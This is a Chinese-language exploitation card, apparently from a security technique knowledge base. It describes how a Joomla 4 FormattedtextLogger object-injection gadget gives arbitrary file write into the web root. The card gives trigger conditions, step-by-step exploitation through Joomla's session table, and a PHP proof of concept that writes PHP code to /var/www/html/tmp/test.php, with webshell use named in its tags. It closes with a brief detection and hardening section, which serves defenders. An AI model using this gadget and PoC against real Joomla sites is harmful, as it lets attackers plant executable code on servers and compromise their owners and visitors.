---
id: web-php-deserialization-joomla4-formattedtextlogger-file-write
title: Joomla 4 FormattedtextLogger __destruct 任意文件写入：path/format 可控，写日志头到 Web 目录
type: scenario
domain: web
path: web/php/deserialization
technique: joomla4-formattedtextlogger-destruct-file-write
aliases:
- Joomla 4 任意文件写入
- FormattedtextLogger
- Joomla 4.2.7 反序列化写文件
- text_file_no_php
- Joomla 日志写入 gadget
tags:
- php
- joomla
- deserialization
- file-write
- gadget
- logger
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:59:03+08:00'
  notes: '已对照原文核对；图03 __destruct、图04 generateFileHeader（format 小写化并去掉 () 与 {）、图05 initFile File::write、图09 Joomla 4.2.7 写出 /var/www/html/tmp/test.php 头（#Fields: <?php phpinfo;?>，触发请求 500）一致；文章 deferredEntries=[''1''] 为字符串条目，卡内 PoC 改数组条目并注明 formatLine(array) 类型与 format 处理限制，可执行内容未证实、confidence=medium 合理；未设 affected_versions（4.2.7 为原文示例版本、非版本区间）'
---

## 一句话结论

Joomla 4 的 `Joomla\CMS\Log\Logger\FormattedtextLogger` 在 `defer=true` 且 `deferredEntries` 非空时，`__destruct()` 会调用 `initFile()`：按对象里的 `path` 创建目录并把 `generateFileHeader()` 的内容写入该文件；`path`、`format`、`options['text_file_no_php']` 都来自反序列化对象，因此对象注入后可以把带攻击者控制内容的日志文件写到 Web 目录，作为任意文件写入原语。

## 原理

- **析构自动触发**：PHP 对象注入后，请求结束销毁对象时自动调用 `__destruct()`。Joomla 4.2.7 中 `FormattedtextLogger::__destruct()` 判断 `if (!$this->defer || empty($this->deferredEntries)) return;`，满足后调用 `$this->initFile()`，再对 `deferredEntries` 逐条 `formatLine()` 并 `File::append()` 追加。
- **路径可控**：`initFile()` 先 `File::exists($this->path)`，不存在则 `Folder::create(\dirname($this->path))`，再 `File::write($this->path, $this->generateFileHeader())`。`$this->path` 是反序列化可控属性，可指向 `tmp/`、模板目录等可写路径。
- **内容可控与限制**：`generateFileHeader()` 把 `$this->format` 小写化并去掉圆括号后写进 `#Fields: ` 行；若 `empty($this->options['text_file_no_php'])` 还会写入 `#<?php die('Forbidden.'); ?>` 保护行，把 `text_file_no_php` 设为非空数组即可省略该行。随后 `__destruct()` 按 `$this->format` 格式化 `deferredEntries` 并追加，这部分保留原始大小写与括号，是写可执行 PHP 的关键。
- **为什么是 gadget**：链只有 `__destruct → initFile → generateFileHeader/File::write`，不依赖其他类，适合作为 Joomla 4 反序列化的收尾；文章示例在 4.2.7 上确实把 `/var/www/html/tmp/test.php` 写出（内容为 `#Date`、`#Software`、`#Fields: <?php phpinfo;?>` 等日志头）。

## 触发条件

- 目标运行 Joomla 4（示例 4.2.7），存在可控 `unserialize()` 入口（如数据库 session 注入）。
- 目标 classpath 中存在 `Joomla\CMS\Log\Logger\FormattedtextLogger` 类（Joomla 4 自带）。
- `path` 指向 Web 进程可写且可被 Web 访问的路径；`deferredEntries` 非空；`options['text_file_no_php']` 非空。
- 若要把内容变成可执行 PHP，需要让追加的 `formatLine` 输出原始 `format`（`deferredEntries` 应为数组条目），或改用它覆盖模板/配置文件。

## 利用步骤

1. 构造 `FormattedtextLogger` 对象：`defer=true`、`deferredEntries=[['message'=>'x']]`（数组条目，便于 `formatLine` 保留原始 format）、`path=/var/www/html/tmp/test.php`、`options=['text_file_no_php'=>['1']]`、`format` 填目标内容。
2. `serialize($obj)` 后 `base64_encode`，按 `joomla|s:N:"<base64>";` 写入 Joomla session 表（或进入其他反序列化入口）。
3. 携带会话 Cookie 请求站点，请求结束时触发 `__destruct`，文件被写入。
4. 访问写入的文件验证；若 header 中 format 被小写化/去括号且未追加原始 format，则该文件只是日志格式，需要调整 `deferredEntries` 结构或改用文件覆盖类利用。

## PoC

```php
<?php
namespace Joomla\CMS\Log\Logger {
    class FormattedtextLogger {
        protected $defer = true;
        protected $deferredEntries = [['message' => 'x']];
        protected $path = '/var/www/html/tmp/test.php';
        protected $options = array('text_file_no_php' => ['1']);
        protected $format = '<?php phpinfo();?>';
    }
}
namespace {
    $obj = new Joomla\CMS\Log\Logger\FormattedtextLogger();
    $str = base64_encode(serialize($obj));
    echo "joomla|" . serialize($str);
}
```

说明：文章示例的 `deferredEntries=['1']` 为字符串条目；按 `formatLine(array $entry)` 的签名，字符串可能触发类型错误导致只写出文件头（截图中的文件内容为日志头）。要写出可执行内容应使用数组条目，实际以目标版本源码为准；本卡 confidence=medium。

## 变体与关联

- **同前缀日志 gadget**：Joomla 还提供 SysLogLogger 等其他 Logger 类，若其写文件路径/内容可控可作替代。
- **入口**：数据库 session 注入见本批 Joomla session 表反序列化卡；其他 Joomla 反序列化入口（扩展、缓存）同理。
- **关联**：[[web-php-deserialization-joomla-phpmailer-sendmail-file-write]]（Joomla 生态另一条文件写入链）。
- **边界**：目标目录不可写、`path` 被校验、Joomla 版本修复了该析构写入、或对象注入被 `allowed_classes` 限制时失败。

## 检测与防御

- **代码修复**：日志路径、format、defer 等属性不应由反序列化数据直接控制；对日志类加入 `__wakeup`/`__unserialize` 校验或禁止序列化。
- **反序列化入口加固**：session 数据签名/白名单类；避免对数据库内容直接 `unserialize`。
- **文件系统**：Web 进程对 Web 目录只授予必要写权限；监控 Web 目录中新增的日志样式文件与 `#Fields:` 内容。
- **检测**：Joomla 进程在 `tmp/`、模板目录写文件；文件内容含 `#Date`、`#Software`、`#Fields:` 等 Joomla 日志头；请求结束后出现异常文件写入。
